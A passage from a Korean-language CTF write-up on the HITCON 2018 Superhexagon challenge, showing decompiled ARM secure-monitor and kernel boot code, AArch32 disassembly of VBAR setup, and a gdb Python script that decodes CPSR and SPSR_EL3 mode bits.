</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (x0 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x83000001</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (is_booted <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>        pwVar2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">get_secure_mem</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">restore_sysregs</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">set_spelx</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>        pwVar2<span style="color:#f92672">-&gt;</span>x0 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffffffffffff</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> pwVar2;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">FUN_0000025c</span>();
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">FUN_000002c8</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">FUN_00000b2c</span>(<span style="color:#ae81ff">0</span>,tmp.PC <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x20</span>,<span style="color:#ae81ff">0x1d3</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">restore_sysregs</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">set_spelx</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>    (<span style="color:#f92672">&amp;</span>wctx)[uVar1].x3 <span style="color:#f92672">=</span> x3;
</span></span><span style="display:flex;"><span>    (<span style="color:#f92672">&amp;</span>wctx)[uVar1].x2 <span style="color:#f92672">=</span> x2;
</span></span><span style="display:flex;"><span>    (<span style="color:#f92672">&amp;</span>wctx)[uVar1].x1 <span style="color:#f92672">=</span> x1;
</span></span><span style="display:flex;"><span>    (<span style="color:#f92672">&amp;</span>wctx)[uVar1].x0 <span style="color:#f92672">=</span> (ulong)x0;
</span></span><span style="display:flex;"><span>    pwVar2 <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>wctx <span style="color:#f92672">+</span> uVar1;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* 0x000000000e002450      0x000000000e002210 */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> pwVar2;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>이제 호출되었을 때 어디로 가는지 확인해야할 필요가 있다.</p>
<h3 id="spsr_el3-structure--gdbscript">SPSR_EL3 structure &amp; gdbscript<a hidden class="anchor" aria-hidden="true" href="#spsr_el3-structure--gdbscript">#</a></h3>
<p><img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/4d39b7ba32f4b5f44407d8d686ee39c4.png" alt=""  />

<img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/daae4d0027962451199dc7bcf06de81a.png" alt=""  />

AArch32에서 exception이 발생했을 때 M bits 인코딩은 위와 같다.
<img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/07f2dae481a603f51efbe843681d5667.png" alt=""  />

<img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/b59dc51b1a23cd667e025f3141869539.png" alt=""  />

AArch64 exception이 발생했을 때 M bits 인코딩은 위와 같다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#f92672">import</span> gdb
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">CPSR</span>(gdb<span style="color:#f92672">.</span>Command):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __init__(self):
</span></span><span style="display:flex;"><span>        super(CPSR, self)<span style="color:#f92672">.</span>__init__(<span style="color:#e6db74">&#34;cpsr&#34;</span>, gdb<span style="color:#f92672">.</span>COMMAND_USER)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">invoke</span>(self, arg, from_tty):
</span></span><span style="display:flex;"><span>        cpsr <span style="color:#f92672">=</span> (int(gdb<span style="color:#f92672">.</span>parse_and_eval(<span style="color:#e6db74">&#34;$cpsr&#34;</span>)))
</span></span><span style="display:flex;"><span>        mode <span style="color:#f92672">=</span> cpsr <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0b1111</span>
</span></span><span style="display:flex;"><span>        is_thumb <span style="color:#f92672">=</span> (cpsr <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">4</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>        state <span style="color:#f92672">=</span> (cpsr <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">4</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>        IRQ <span style="color:#f92672">=</span> (cpsr <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">5</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>        FIQ <span style="color:#f92672">=</span> (cpsr <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">6</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>        cond <span style="color:#f92672">=</span> (cpsr <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">27</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0b1111</span>
</span></span><span style="display:flex;"><span>        re <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> state:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#ae81ff">0b0000</span> <span style="color:#f92672">==</span> mode:
</span></span><span style="display:flex;"><span>                re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;EL0t&#39;</span> <span style="color:#75715e"># SP_EL0</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">elif</span> <span style="color:#ae81ff">0b0100</span> <span style="color:#f92672">==</span> mode:
</span></span><span style="display:flex;"><span>                re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;EL1t&#39;</span> <span style="color:#75715e"># SP_EL0</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">elif</span> <span style="color:#ae81ff">0b0101</span> <span style="color:#f92672">==</span> mode:
</span></span><span style="display:flex;"><span>                re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;EL1h&#39;</span> <span style="color:#75715e"># SP_EL1</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">elif</span> <span style="color:#ae81ff">0b1000</span> <span style="color:#f92672">==</span> mode:
</span></span><span style="display:flex;"><span>                re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;EL2t&#39;</span> <span style="color:#75715e"># SP_EL0</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">elif</span> <span style="color:#ae81ff">0b1001</span> <span style="color:#f92672">==</span> mode:
</span></span><span style="display:flex;"><span>                re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;EL2h&#39;</span> <span style="color:#75715e"># SP_EL2</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">elif</span> <span style="color:#ae81ff">0b1100</span> <span style="color:#f92672">==</span> mode:
</span></span><span style="display:flex;"><span>                re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;EL3t&#39;</span> <span style="color:#75715e"># SP_EL0</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">elif</span> <span style="color:#ae81ff">0b1101</span> <span style="color:#f92672">==</span> mode:
</span></span><span style="display:flex;"><span>                re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;EL3h&#39;</span> <span style="color:#75715e"># SP_EL3</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>                re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;UNK&#39;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#ae81ff">0b0000</span> <span style="color:#f92672">==</span> mode:
</span></span><span style="display:flex;"><span>                re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;User&#39;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">elif</span> <span style="color:#ae81ff">0b0001</span> <span style="color:#f92672">==</span> mode:
</span></span><span style="display:flex;"><span>                re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;FIQ&#39;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">elif</span> <span style="color:#ae81ff">0b0010</span> <span style="color:#f92672">==</span> mode:
</span></span><span style="display:flex;"><span>                re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;IRQ&#39;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">elif</span> <span style="color:#ae81ff">0b0011</span> <span style="color:#f92672">==</span> mode:
</span></span><span style="display:flex;"><span>                re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;Supervisor&#39;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">elif</span> <span style="color:#ae81ff">0b0110</span> <span style="color:#f92672">==</span> mode:
</span></span><span style="display:flex;"><span>                re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;Monitor&#39;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">elif</span> <span style="color:#ae81ff">0b0111</span> <span style="color:#f92672">==</span> mode:
</span></span><span style="display:flex;"><span>                re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;Abort&#39;</span> 
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">elif</span> <span style="color:#ae81ff">0b1010</span> <span style="color:#f92672">==</span> mode:
</span></span><span style="display:flex;"><span>                re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;Hyp&#39;</span> 
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">elif</span> <span style="color:#ae81ff">0b1011</span> <span style="color:#f92672">==</span> mode:
</span></span><span style="display:flex;"><span>                re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;Undefined&#39;</span> 
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">elif</span> <span style="color:#ae81ff">0b1111</span> <span style="color:#f92672">==</span> mode:
</span></span><span style="display:flex;"><span>                re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;System&#39;</span> 
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>                re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;UNK&#39;</span>
</span></span><span style="display:flex;"><span>        re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39; | &#39;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> IRQ:
</span></span><span style="display:flex;"><span>            re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;IRQ_MASKED | &#39;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> FIQ:
</span></span><span style="display:flex;"><span>            re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;FIQ_MASKED | &#39;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> is_thumb:
</span></span><span style="display:flex;"><span>            re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;THUMB_MODE | &#39;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> state:
</span></span><span style="display:flex;"><span>            re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;32-BIT | &#39;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;64-BIT | &#39;</span>
</span></span><span style="display:flex;"><span>        re <span style="color:#f92672">+=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;COND_</span><span style="color:#e6db74">{</span>hex(cond)[<span style="color:#ae81ff">2</span>:]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>        print(re)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">SPSR_EL3</span>(gdb<span style="color:#f92672">.</span>Command):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __init__(self):
</span></span><span style="display:flex;"><span>        super(SPSR_EL3, self)<span style="color:#f92672">.</span>__init__(<span style="color:#e6db74">&#34;spsr_el3&#34;</span>, gdb<span style="color:#f92672">.</span>COMMAND_USER)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">invoke</span>(self, arg, from_tty):
</span></span><span style="display:flex;"><span>        spsr <span style="color:#f92672">=</span> (int(gdb<span style="color:#f92672">.</span>parse_and_eval(<span style="color:#e6db74">&#34;$SPSR_EL3&#34;</span>)))
</span></span><span style="display:flex;"><span>        mode <span style="color:#f92672">=</span> spsr <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0b1111</span>
</span></span><span style="display:flex;"><span>        is_thumb <span style="color:#f92672">=</span> (spsr <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">4</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>        IRQ <span style="color:#f92672">=</span> (spsr <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">7</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>        FIQ <span style="color:#f92672">=</span> (spsr <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">6</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>        cond <span style="color:#f92672">=</span> (spsr <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">27</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0b11111</span>
</span></span><span style="display:flex;"><span>        state <span style="color:#f92672">=</span> (spsr <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">4</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>        re <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> state:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#ae81ff">0b0000</span> <span style="color:#f92672">==</span> mode:
</span></span><span style="display:flex;"><span>                re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;EL0t&#39;</span> <span style="color:#75715e"># SP_EL0</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">elif</span> <span style="color:#ae81ff">0b0100</span> <span style="color:#f92672">==</span> mode:
</span></span><span style="display:flex;"><span>                re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;EL1t&#39;</span> <span style="color:#75715e"># SP_EL0</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">elif</span> <span style="color:#ae81ff">0b0101</span> <span style="color:#f92672">==</span> mode:
</span></span><span style="display:flex;"><span>                re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;EL1h&#39;</span> <span style="color:#75715e"># SP_EL1</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">elif</span> <span style="color:#ae81ff">0b1000</span> <span style="color:#f92672">==</span> mode:
</span></span><span style="display:flex;"><span>                re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;EL2t&#39;</span> <span style="color:#75715e"># SP_EL0</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">elif</span> <span style="color:#ae81ff">0b1001</span> <span style="color:#f92672">==</span> mode:
</span></span><span style="display:flex;"><span>                re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;EL2h&#39;</span> <span style="color:#75715e"># SP_EL2</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">elif</span> <span style="color:#ae81ff">0b1100</span> <span style="color:#f92672">==</span> mode:
</span></span><span style="display:flex;"><span>                re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;EL3t&#39;</span> <span style="color:#75715e"># SP_EL0</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">elif</span> <span style="color:#ae81ff">0b1101</span> <span style="color:#f92672">==</span> mode:
</span></span><span style="display:flex;"><span>                re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;EL3h&#39;</span> <span style="color:#75715e"># SP_EL3</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>                re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;UNK&#39;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#ae81ff">0b0000</span> <span style="color:#f92672">==</span> mode:
</span></span><span style="display:flex;"><span>                re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;User&#39;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">elif</span> <span style="color:#ae81ff">0b0001</span> <span style="color:#f92672">==</span> mode:
</span></span><span style="display:flex;"><span>                re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;FIQ&#39;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">elif</span> <span style="color:#ae81ff">0b0010</span> <span style="color:#f92672">==</span> mode:
</span></span><span style="display:flex;"><span>                re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;IRQ&#39;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">elif</span> <span style="color:#ae81ff">0b0011</span> <span style="color:#f92672">==</span> mode:
</span></span><span style="display:flex;"><span>                re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;Supervisor&#39;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">elif</span> <span style="color:#ae81ff">0b0110</span> <span style="color:#f92672">==</span> mode:
</span></span><span style="display:flex;"><span>                re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;Monitor&#39;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">elif</span> <span style="color:#ae81ff">0b0111</span> <span style="color:#f92672">==</span> mode:
</span></span><span style="display:flex;"><span>                re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;Abort&#39;</span> 
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">elif</span> <span style="color:#ae81ff">0b1010</span> <span style="color:#f92672">==</span> mode:
</span></span><span style="display:flex;"><span>                re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;Hyp&#39;</span> 
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">elif</span> <span style="color:#ae81ff">0b1011</span> <span style="color:#f92672">==</span> mode:
</span></span><span style="display:flex;"><span>                re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;Undefined&#39;</span> 
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">elif</span> <span style="color:#ae81ff">0b1111</span> <span style="color:#f92672">==</span> mode:
</span></span><span style="display:flex;"><span>                re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;System&#39;</span> 
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>                re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;UNK&#39;</span>
</span></span><span style="display:flex;"><span>        re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39; | &#39;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> IRQ:
</span></span><span style="display:flex;"><span>            re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;IRQ_MASKED | &#39;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> FIQ:
</span></span><span style="display:flex;"><span>            re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;FIQ_MASKED | &#39;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> is_thumb:
</span></span><span style="display:flex;"><span>            re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;THUMB_MODE | &#39;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> state:
</span></span><span style="display:flex;"><span>            re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;32-BIT | &#39;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;64-BIT | &#39;</span>
</span></span><span style="display:flex;"><span>        re <span style="color:#f92672">+=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;COND_</span><span style="color:#e6db74">{</span>hex(cond)[<span style="color:#ae81ff">2</span>:]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>        print(re)
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>CPSR()
</span></span><span style="display:flex;"><span>SPSR_EL3()
</span></span></code></pre></div><p>기존 cpsr도 같이 수정했다.
<img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/1053b8224ac974f745e085a7978fc258.png" alt=""  />
</p>
<h3 id="aarch32-pe-modes">AArch32 PE modes<a hidden class="anchor" aria-hidden="true" href="#aarch32-pe-modes">#</a></h3>
<p>근데 mode가 약간 생소하다.
<img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/cf8ff4ac90a9a7be9a6b9d2330073709.png" alt=""  />

<img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/29573e26e1e2c0ae06c50a30d87df00b.png" alt=""  />

그냥 이름만 있어보이게 나눠놓고 결국 결론은 S-EL1이다.</p>
<h3 id="diving-into-bl1-again">Diving into BL1 again<a hidden class="anchor" aria-hidden="true" href="#diving-into-bl1-again">#</a></h3>
<p><img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/643d7f7884b1853da9f0537f822dc09e.png" alt=""  />

S-EL1을 보다가 못 읽겠어서 이번엔 aarch32 manual을 찾아서 읽어봤다.
그랬더니 이미 정의된 주소로 핸들링을 수행한다고 한다.
Secure VBAR을 확인해야한다.</p>
<pre tabindex="0"><code class="language-Assembly" data-lang="Assembly">                             *************************************************************
                             *                           FUNCTION                          
                             *************************************************************
                             undefined  FUN_000014f4 ()
             undefined         r0:1           &lt;RETURN&gt;
                             FUN_000014f4                                    XREF[1]:     Reset:00000000 (T) , 
                                                                                          Reset:00000000 (j)   
        000014f4 00  80  a0  e1    cpy        r8,r0
        000014f8 2c  80  8f  e5    str        r8,[DAT_0000152c ]
                             SCTLR
        000014fc 10  0f  11  ee    mrc        p15,0x0 ,r0,cr1 ,cr0 ,0x0                          SCTLR
        00001500 01  00  c0  e3    bic        r0,r0,#0x1
        00001504 02  00  c0  e3    bic        r0,r0,#0x2
        00001508 04  00  c0  e3    bic        r0,r0,#0x4
        0000150c 08  00  c0  e3    bic        r0,r0,#0x8
        00001510 10  00  c0  e3    bic        r0,r0,#0x10
        00001514 01  0a  c0  e3    bic        r0,r0,#0x1000
        00001518 10  0f  01  ee    mcr        p15,0x0 ,r0,cr1 ,cr0 ,0x0
                             VBAR
        0000151c 10  8f  0c  ee    mcr        p15,0x0 ,r8,cr12 ,cr0 ,0x0
        00001520 36  00  00  eb    bl         FUN_00001600                                     undefined FUN_00001600()
        00001524 5b  00  00  eb    bl         FUN_00001698                                     undefined FUN_00001698()
                             LAB_00001528                                    XREF[1]:     00001528 (j)   
        00001528 fe  ff  ff  ea    b          LAB_00001528
</code></pre><p>aarch64와 다르게 생소하게 접근한다.
<img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/340843d4ea3252d12bf8101be370fa9b.png" alt=""  />

읽는 법은 위처럼 읽으면 된다.</p>
<p>근데 여기서 VBAR 인자가 뭔지 잘 모르겠다
그래서 부트로더로 다시 돌아가서 secure world가 어떻게 초기화되는지 분석해야한다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">FUN_ffffffffc0008000</span>(<span style="color:#66d9ef">void</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  vbar_el1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffffc000a000</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">InstructionSynchronizationBarrier</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">FUN_ffffffffc0009234</span>(DAT_ffffffffc0008048,DAT_ffffffffc0008050);
</span></span><span style="display:flex;"><span>  spsel <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">FUN_ffffffffc0008228</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">FUN_ffffffffc0008930</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">FUN_ffffffffc0008210</span>();
</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* trustzone initialize */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">FUN_ffffffffc00081e8</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">FUN_ffffffffc00083a8</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">FUN_ffffffffc000914c</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">do</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">WaitForInterrupt</span>();
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">while</span>( true );
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>kernel의 첫 페이지는 IPA 0x0에 매핑되어있다.
그래서 실질적으로 rebase해서 EL1을 분석할 때는 초기 페이지들을 날리고 했어야했다.
어쨋든 FUN_ffffffffc0008210에서 TEE OS initialize를 한다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>                             <span style="color:#f92672">*************************************************************</span>
</span></span><span style="display:flex;"><span>                             <span style="color:#f92672">*</span>                           FUNCTION                          
</span></span><span style="display:flex;"><span>                             <span style="color:#f92672">*************************************************************</span>
</span></span><span style="display:flex;"><span>                             undefined  <span style="color:#a6e22e">FUN_ffffffffc00081e8</span> ()
</span></span><span style="display:flex;"><span>             undefined         w0:<span style="color:#ae81ff">1</span>           <span style="color:#f92672">&lt;</span>RETURN<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>             undefined8        Stack[<span style="color:#f92672">-</span><span style="color:#ae81ff">0x10</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">8</span> local_10                                XREF[<span style="color:#ae81ff">2</span>]<span style="color:#f92672">:</span>     ffffffffc00081e8
</span></span><span style="display:flex;"><span>                                                                                                   ffffffffc0008208
</span></span><span style="display:flex;"><span>                             FUN_ffffffffc00081e8                            XREF[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">:</span>     FUN_ffffffffc0008000:ffffffffc00
</span></span><span style="display:flex;"><span>     fffc00081e8 fd  <span style="color:#ae81ff">7</span>b  bf  a9    stp        x29 ,x30 ,[sp, <span style="color:#960050;background-color:#1e0010">#</span>local_10 ]<span style="color:#f92672">!</span>
</span></span><span style="display:flex;"><span>     fffc00081ec fd  <span style="color:#ae81ff">03</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">91</span>    mov        x29 ,sp
</span></span><span style="display:flex;"><span>     fffc00081f0 <span style="color:#ae81ff">03</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">80</span>  d2    mov        x3,<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>     fffc00081f4 <span style="color:#ae81ff">02</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">80</span>  d2    mov        x2,<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>     fffc00081f8 <span style="color:#ae81ff">01</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">80</span>  d2    mov        x1,<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>     fffc00081fc <span style="color:#ae81ff">20</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">80</span>  d2    mov        x0,<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x1</span>
